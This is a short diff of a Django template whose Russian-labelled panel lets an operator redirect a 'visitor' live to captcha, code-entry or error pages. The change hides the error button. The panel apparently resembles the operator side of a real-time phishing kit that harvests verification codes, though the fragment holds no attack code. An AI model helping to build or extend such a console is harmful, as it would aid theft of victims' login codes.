@@ -40,7 +40,7 @@
         <div class="quick-actions">
             <button type="button" class="quick-action" id="redirect-captcha" data-url="{% url 'captcha' %}" data-step="captcha" disabled>На капчу</button>
             <button type="button" class="quick-action" id="redirect-code" data-url="{% url 'code' %}" data-step="code" disabled>На код</button>
-            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" data-step="error" disabled>На ошибку</button>
+            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" data-step="error" disabled style="display: none">На ошибку</button>
         </div>
         <p class="hint" id="redirect-hint">Посетитель будет перенаправлен на указанную страницу прямо в браузере.</p>
     </div>
